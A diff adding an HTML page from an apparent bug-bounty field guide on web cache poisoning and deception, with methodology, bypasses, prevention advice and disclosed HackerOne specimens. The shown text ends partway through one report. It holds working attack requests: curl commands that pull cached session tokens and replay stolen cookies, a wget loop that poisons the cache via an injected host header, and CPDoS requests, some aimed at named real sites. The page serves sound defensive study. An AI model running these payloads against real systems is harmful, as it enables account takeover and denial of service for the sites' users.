@@ -1,0 +1,610 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Web Cache Poisoning &amp; Deception · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Web Cache Poisoning &amp; Deception</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="on" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-high)"></span>Vulnerabilities</div>
+      <h1>Web Cache Poisoning &amp; Deception</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>36</b></span><a class="chip lab" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Web cache poisoning</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>A shared cache (CDN, edge, reverse proxy) stores one response and hands it to everyone whose request maps to the same <strong>cache key</strong>. The key is a subset of the request — usually method + host + path, and <em>maybe</em> a few headers/params. Everything the origin actually uses to build the response but the cache <em>doesn't</em> key on is an <strong>unkeyed input</strong>, and every web-cache bug is that same disagreement: the cache thinks two requests are equivalent when the origin would answer them differently.</p>
+<p>Two families fall out of this. <strong>Web Cache Deception (WCD)</strong> tricks the cache into storing a <em>victim's</em> personalized/authenticated response under a key the <em>attacker</em> can fetch — so session cookies, PII, and CSRF tokens leak to anyone. <strong>Web Cache Poisoning (WCP)</strong> injects an <em>attacker-controlled</em> value through an unkeyed input into a shared key, so the poisoned response (stored XSS, open redirect, or an error page — CPDoS) is served to <em>every</em> subsequent user. WCD reads secrets <em>out</em>; WCP writes attacker content <em>in</em>.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Detect the cache.</strong> Look for <code>X-Cache: HIT/MISS</code>, <code>CF-Cache-Status</code>, <code>Age:</code>, <code>X-Served-By</code>, <code>Cache-Control</code>. Send a request twice and watch a HIT appear.</li><li><strong>Always cache-bust first.</strong> Append a unique junk query param (<code>?cb=UNIQ</code>) so your experiments poison <em>your own</em> key, not real users. Only drop the buster once the PoC is proven.</li><li><strong>For WCD:</strong> take a personalized page and append a static-looking suffix (<code>/x.css</code>, <code>/x.js</code>, <code>/x.jpg</code>). If it still returns <code>200</code> with the victim's data <em>and</em> becomes cacheable, fetch it anonymously and grep for the leak.</li><li><strong>For WCP:</strong> enumerate unkeyed inputs (headers/params) — send a value and grep the body/links/redirects for its reflection. Anything reflected but absent from the key is a poisoning primitive.</li><li><strong>Confirm cacheability.</strong> Replay the request <em>without</em> the injected input under the same key; if the poison persists (<code>HIT</code>), the shared key is poisoned.</li><li><strong>Escalate the leak/poison</strong> — session/CSRF token → ATO, host reflection → XSS/redirect, normalization mismatch → cached error → DoS.</li></ol>
+<div class="pre" data-lang="bash"># Cache tells — send twice, second should HIT
+curl -sD- -o /dev/null 'https://TARGET/path?cb=UNIQ'
+curl -sD- -o /dev/null 'https://TARGET/path?cb=UNIQ' | grep -iE 'x-cache|cf-cache|age:'</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>The single controlling question for the whole class is: <strong>do the cache and the origin agree on the key and on the response?</strong> WCD is a <em>response-sensitivity</em> disagreement (cache thinks it's static, origin made it personal); WCP is a <em>keying</em> disagreement (origin varies on an input the cache ignores). Find the disagreement and you have the bug.</div></div>
+<h2 class="sec" id="web-cache-deception-wcd"><span class="tick">§</span>Web Cache Deception (WCD)</h2>
+<p>The origin serves a personalized <code>200</code> for a URL the cache mistakes for a static asset (keying on the file <em>extension</em>, not the real <code>Content-Type</code>). Lure the authenticated victim to the trap URL; their private response gets cached; you fetch the same URL with no cookies.</p>
+<h3 class="sub" id="static-extension-path-confusion">Static-extension path confusion</h3>
+<p>Append a fake filename with a cached extension to an authenticated page. The origin ignores the extra path segment and renders the personalized page; the edge caches it as <code>static.css</code>.</p>
+<div class="pre" data-lang="bash"># 1) victim (authenticated) is lured to open:
+https://TARGET/account/profile/x.css
+# 2) attacker fetches the cached copy with NO cookies:
+curl -s 'https://TARGET/account/profile/x.css' | grep -Ei 'csrf|email|session|username'</div>
+<p>Battery of suffixes to try — CDNs cache different sets: <code>.css</code>, <code>.js</code>, <code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>, <code>.gif</code>, <code>.txt</code>, <code>.ico</code>, <code>.svg</code>, <code>.woff</code>. <code>200 OK</code> caches longest, so prefer endpoints that return <code>200</code> with the token in-body.</p>
+<h3 class="sub" id="grep-the-cached-body-for-auth-material-not-just-pii">Grep the cached body for auth material, not just PII</h3>
+<p>The escalation from info-leak to account takeover is which string you grep for. A cached email is a leak; a cached <strong>session cookie</strong> or <strong>CSRF token</strong> is an ATO. Always search the cached response for both.</p>
+<div class="pre" data-lang="bash"># a reflected session token in the cached HTML → cookie replay → ATO
+curl -s 'https://TARGET/search/.../minNightlyPrice/x.jpeg?cb=1' --compressed | grep -i 'SESSION'
+# then replay it:
+curl -s 'https://TARGET/account/edit' -H 'Cookie: SESSION=&lt;stolen&gt;'</div>
+<h3 class="sub" id="cacheable-response-that-carries-set-cookie">Cacheable response that carries <code>Set-Cookie</code></h3>
+<p>Some file/blob/avatar routes emit <code>Cache-Control: public</code> <em>and</em> a <code>Set-Cookie</code> in the same response, with no <code>Vary: Cookie</code>. A shared proxy caches the session cookie and hands it to unrelated users — no path trick needed, the header combo alone leaks sessions. (Rails Active Storage <code>&gt;= 5.2.0, &lt; 7.1.0</code>, CVE-2024-26144, is a framework-level instance.)</p>
+<div class="pre" data-lang="http">HTTP/1.1 200 OK
+Cache-Control: public
+Set-Cookie: _session_id=&lt;VICTIM_SESSION&gt;; path=/
+# a caching proxy stores and replays this Set-Cookie to the next visitor</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>WCD requires the trap URL to reach the shared cache <em>keyed the way the victim's normal request would be</em>, and the victim must actually visit it. If the cache keys on cookies, or serves <code>private</code>, or the extension isn't in its static ruleset, there is no bug — confirm the anonymous fetch returns <code>X-Cache: HIT</code> with the victim's data still in the body before claiming impact.</div></div>
+<h2 class="sec" id="web-cache-poisoning-wcp"><span class="tick">§</span>Web Cache Poisoning (WCP)</h2>
+<p>The origin reflects an <strong>unkeyed input</strong> into the response; the cache stores it and serves it to everyone. Develop the poison under a private buster key, then drop the buster to hit the shared key.</p>
+<h3 class="sub" id="unkeyed-header-reflected-into-links-redirects">Unkeyed header reflected into links / redirects</h3>
+<p><code>X-Forwarded-Host</code>, <code>X-Forwarded-Scheme</code>, <code>X-Forwarded-Port</code>, <code>X-Forwarded-Url</code>, <code>X-Host</code>, or raw <code>Host</code>/port frequently get reflected into absolute asset URLs, form actions, or a <code>Location</code> redirect — while the cache keys only on the path. Poison it and every visitor loads scripts/links from your host.</p>
+<div class="pre" data-lang="http">GET /path?cb=UNIQ HTTP/1.1
+Host: TARGET
+X-Forwarded-Host: COLLAB
+X-Forwarded-Scheme: nothttps
+X-Forwarded-Port: 1
+# grep the response for COLLAB / port 1 in &lt;script src&gt;, &lt;link href&gt;, or Location:</div>
+<div class="pre" data-lang="bash"># loop until the poison is stored under the buster key, then confirm:
+while true; do wget "https://TARGET/?cb=UNIQ" --header 'X-Forwarded-Host: COLLAB/#' -qO- &gt;/dev/null; done
+wget "https://TARGET/?cb=UNIQ" -qO- | grep COLLAB    # trailing /# neutralizes the rest of the URL</div>
+<h3 class="sub" id="cache-key-normalization-mismatch-cpdos">Cache-key normalization mismatch → CPDoS</h3>
+<p>When the edge and origin canonicalize a path differently, one collapses a character the other rejects — so a <code>404</code>/error gets stored under a <em>valid</em> asset's key (self-inflicted denial of service). Diff how each side handles backslash-vs-slash, trailing dot, case, encoded chars, port.</p>
+<div class="pre" data-lang="http">GET /static\javascripts\vendor\app.min.js?cb=UNIQ HTTP/1.1
+Host: cdn.TARGET.com
+Connection: close
+# edge rewrites \ → / (keys on the real asset) but origin 404s the backslash path
+# → the 404 is cached under the legit JS bundle's key</div>
+<h3 class="sub" id="method-verb-special-header-desync">Method/verb &amp; special-header desync</h3>
+<p>Edge and origin disagree on a request modifier, caching an empty or error body under a <code>GET</code> key. <code>X-HTTP-Method-Override: HEAD</code> caches an empty-body <code>200</code>; <code>PURGE</code>, the <code>trailer</code> header, or vendor headers like <code>X-CF-APP-INSTANCE</code> force a cached <code>4xx</code>.</p>
+<div class="pre" data-lang="http">GET /app.js?cb=UNIQ HTTP/1.1
+Host: TARGET
+X-HTTP-Method-Override: HEAD
+# origin serves empty body; edge caches it under the GET key → asset breaks for all users</div>
+<h3 class="sub" id="reflected-origin-in-cors-headers-cached">Reflected <code>Origin</code> in CORS headers, cached</h3>
+<p>If the origin reflects the request <code>Origin</code> into <code>Access-Control-Allow-Origin</code> and that response is cacheable, the cache pins one origin's ACAO for everyone — either breaking cross-origin clients (DoS) or, if <code>null</code>/attacker origin sticks, enabling cross-origin reads.</p>
+<div class="pre" data-lang="http">GET /api/data HTTP/1.1
+Host: TARGET
+Origin: https://COLLAB
+# response: Access-Control-Allow-Origin: https://COLLAB  ← cached and cross-served</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>The poison only sticks if the reflected input is genuinely <strong>unkeyed</strong>. Verify by replaying the request with the injected header <em>removed</em> and the same buster: a persistent poisoned body (<code>X-Cache: HIT</code>) proves the header is not in the key. If removing it changes the response, the cache <em>is</em> keying on it — no poisoning.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Literal slash blocked in path confusion</td><td>double/URL-encoded slash <code>%25%32%46</code> → <code>%2F</code> → <code>/</code> reintroduces WCD</td><td>#1271944</td></tr><tr><td>Edge/origin path canonicalization</td><td>backslash <code>\</code> collapsed to <code>/</code> by edge but <code>404</code>'d by origin → cached error</td><td>#1695604</td></tr><tr><td>Distinct hosts, distinct keys</td><td>URL-decoded userinfo before <code>@</code> smuggles <code>%2f</code>/<code>%3f</code> into the key → host collision</td><td>#824753</td></tr><tr><td>Injected host bleeds into URL path</td><td>trailing <code>/#</code> on <code>X-Forwarded-Host</code> neutralizes the rest of the URL</td><td>#429747</td></tr><tr><td>WAF + cache-key both stop at a limit</td><td>pad <code>≥94</code> request headers so the trailing keyed/inspected header falls off</td><td>#3027461</td></tr><tr><td>Testing would DoS real users</td><td>unique cache-buster query param scopes the poison to your own key</td><td>#1010858</td></tr><tr><td>Reflected-param sanitizer</td><td>URL-encoded NUL byte + oversized value in a reflected param poisons cached JS</td><td>#334709</td></tr><tr><td>Response looks non-cacheable</td><td><code>X-HTTP-Method-Override: HEAD</code> caches an empty-body <code>200</code>; <code>trailer</code> forces a cached <code>400</code></td><td>#2860983, #1219038</td></tr><tr><td>Extension not in static ruleset</td><td><code>REQUEST_URI</code>-vs-canonical-path mismatch caches a personalized page</td><td>#241323</td></tr></tbody></table></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Cache bugs are hubs, not endpoints — the leaked/poisoned primitive chains into whatever the reflected value can reach:</p>
+<ul><li><strong>WCD → reflected session cookie → cookie replay → ATO</strong> (<code>#1698316</code>) — the dominant escalation; grep cached responses for cookies/CSRF tokens, not just PII.</li><li><strong>WCD → cacheable <code>Set-Cookie</code> cross-served → session hijack</strong> (<code>#3082917</code>) — no path trick, just the dangerous <code>Set-Cookie</code> + <code>Cache-Control: public</code> combo.</li><li><strong>WCD → CSRF-token leak → forged email change → ATO</strong> (<code>#260697</code>, <code>#1271944</code>) — the cached CSRF token defeats token-based CSRF, then you forge the email change and confirm attacker-owned email. Chains into <a href="#">CSRF</a>.</li><li><strong>WCP unkeyed header → stored XSS / open redirect to all users</strong> — a reflected host/markup served from a shared key is stored <a href="#">XSS</a> for everyone.</li><li><strong>Header-count overflow → cache-key bypass + WAF bypass to origin</strong> (<code>#3027461</code>) — padding past the parser limit drops the trailing keyed <em>and</em> inspected header, reaching origin uninspected: a WAF-evasion primitive, not just a cache bug.</li><li><strong>WCP normalization/method desync → CPDoS</strong> (<code>#1695604</code>) — a cached error/empty body takes a critical asset offline for every user.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Key on real content sensitivity, not URL extension.</strong> Cache by the origin's actual <code>Content-Type</code>, never the file suffix — this alone kills WCD.</li><li><strong>Never cache authenticated/personalized responses.</strong> Send <code>Cache-Control: private, no-store</code> on anything reflecting a session cookie, CSRF token, or PII; add <code>Vary: Cookie</code>.</li><li><strong>Include every reflected input in the cache key</strong>, or strip unkeyed headers (<code>X-Forwarded-*</code>, <code>X-Host</code>, method-override) at the edge and never reflect them into the body.</li><li><strong>Canonicalize identically at edge and origin</strong> — same backslash / encoded-slash / case / trailing-dot / port handling — so the two never disagree on a key.</li><li><strong>Don't cache <code>Set-Cookie</code>, error, or CORS-reflected responses.</strong> A recognizable non-exploitable variant is one where the personalized response is already <code>private</code>/<code>no-store</code>, or where the reflected header is confirmed to be in the cache key.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Param Miner</strong> — unkeyed-header/param discovery and WCD scanning; the workhorse for this class.</li><li><strong>Burp Repeater / Intruder</strong> — poison loops with a cache-buster; watch <code>X-Cache</code>/<code>Age</code> flip to HIT.</li><li><strong><code>curl</code> / <code>wget</code></strong> — anonymous cached-copy retrieval and <code>grep</code> confirmation of the leak/poison.</li><li><strong>CDN cache-status headers</strong> — <code>X-Cache</code>, <code>CF-Cache-Status</code>, <code>Age</code>, <code>X-Served-By</code>, plus Cloudflare's <code>http.request.headers.truncated</code> tell for header-count overflow.</li><li><strong>A collaborator host</strong> — to confirm reflected-host poisoning fires against a real listener.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>36</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1698316" style="--sv:var(--sev-high)" data-sev="3" data-votes="158" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Web cache deception to account takeover via session token reflected on cacheable page</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1698316</b> · expediagroup_bbp · awarded · 158 votes · resolved</div>
+<div class="taxo"><span>Program <b>expediagroup_bbp</b></span><span>Surface <b>web</b></span><span>Chain <b>WCD path confusion -&gt; cached session token -&gt; cookie r</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An authenticated page reflected the user's session cookie (HASESSIONV3) into its HTML body, and the edge cached responses purely on the static file extension in the path. Luring a victim to a .jpeg-suffixed variant of that page caches their session token, which the attacker then retrieves anonymously.</p>
+<h4>Method</h4><ol><li>Find an authenticated response that reflects a session token / CSRF crumb in the body.</li><li>Append a static-looking extension via path confusion to make the edge treat the response as cacheable (e.g. .../minNightlyPrice/x.jpeg?triagethis).</li><li>Lure the authenticated victim to open that URL so their token is cached.</li><li>From any other browser/IP served by the same cache, fetch the same URL and grep the response for the session token, then reuse it.</li></ol>
+<div class="pre"># victim opens (authenticated):
+https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis
+
+# attacker fetches the cached copy:
+curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'
+
+# then replay the stolen cookie:
+GET /traveler/profile/edit HTTP/2
+Host: www.abritel.fr
+Cookie: HASESSIONV3=&lt;stolen token&gt;</div>
+<p class="insight"><b>Insight —</b> WCD escalates from info-leak to full ATO whenever the cached page reflects a live session token or auth crumb. Always grep cached WCD responses for cookies/CSRF tokens, not just PII. 200 OK responses cache longest, so aim for endpoints that return 200 with the token in-body.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1698316" target="_blank" rel="noopener">hackerone.com/reports/1698316</a></span><a class="src" href="#report-1698316" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1160407" style="--sv:var(--sev-high)" data-sev="3" data-votes="83" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>x-http-method-override + PURGE cache poisoning -&gt; empty JS/CSS on CDN</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#1160407</b> · gitlab · awarded · 83 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Tag <b>cloud-gcp</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The GCP-backed CDN honors x-http-method-override: HEAD (returning an empty body) while Varnish does not include that header in the cache key, so the empty response is cached and served to normal GETs; unauthenticated PURGE lets an attacker clear real cached files and re-poison them.</p>
+<h4>Method</h4><ol><li>Pick a cached JS/CSS asset (confirm X-Cache: HIT)</li><li>Send GET ...?cb=x with x-http-method-override: HEAD -&gt; empty response, now cached</li><li>Confirm normal GET of that URL returns empty; use PURGE to evict/repoison live files</li><li>Missing JS/CSS makes the app unusable</li></ol>
+<div class="pre">GET /assets/webpack/....chunk.js?cb=x HTTP/1.1
+Host: assets.gitlab-static.net
+x-http-method-override: HEAD</div>
+<p class="insight"><b>Insight —</b> Method-override headers and permitted PURGE/HEAD verbs are underrated cache-poisoning inputs: they can cache an empty 200. Test x-http-method-override, and check whether PURGE is unauthenticated (lets you poison live, already-cached files).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1160407" target="_blank" rel="noopener">hackerone.com/reports/1160407</a></span><a class="src" href="#report-1160407" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3082917" style="--sv:var(--sev-high)" data-sev="3" data-votes="82" data-bounty="4323">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Cacheable response carrying Set-Cookie leaks sessions across users</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#3082917</b> · ibb · USD 4323 · 82 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>cacheable blob response with Set-Cookie -&gt; proxy caches s</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Rails Active Storage served blobs with both a Set-Cookie (user session) and Cache-Control: public (CVE-2024-26144); a shared caching proxy stores the response including the session cookie and later serves it to unrelated users, disclosing the original user's session.</p>
+<h4>Method</h4><ol><li>Find responses that are both cacheable (Cache-Control: public / no Vary on cookie) and set a session cookie (Active Storage blob URLs, avatar/file endpoints)</li><li>Request the resource as an authenticated user through the shared cache</li><li>Fetch the same URL as an unrelated/anon user; check whether the cached Set-Cookie returns the first user's session</li><li>If so, session hijack the original user</li></ol>
+<div class="pre"># tell-tale response headers on a blob/file endpoint
+HTTP/1.1 200 OK
+Cache-Control: public
+Set-Cookie: _session_id=&lt;VICTIM_SESSION&gt;; ...
+# a caching proxy stores and replays Set-Cookie to other users</div>
+<p class="insight"><b>Insight —</b> Audit for the dangerous combo Set-Cookie + Cache-Control: public (and missing Vary) on any file/blob/avatar route - CDNs and proxies will cache and cross-serve the session cookie. This is a framework-level class (check Active Storage versions &gt;=5.2.0 &lt;7.1.0).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3082917" target="_blank" rel="noopener">hackerone.com/reports/3082917</a></span><a class="src" href="#report-3082917" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-3027461" style="--sv:var(--sev-high)" data-sev="3" data-votes="74" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP header-count overflow bypasses cache-key eval and WAF</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#3027461</b> · cloudflare · awarded · 74 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Chain <b>header overflow -&gt; cache-key bypass -&gt; web cache poiso</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The edge (openresty Front Line) parses at most ~100 request headers including internal ones; once a request exceeds ~94 attacker headers, subsequent keyed headers are dropped from cache-key evaluation and WAF rules stop seeing later headers, so a keyed/malicious header slips through unkeyed and uninspected.</p>
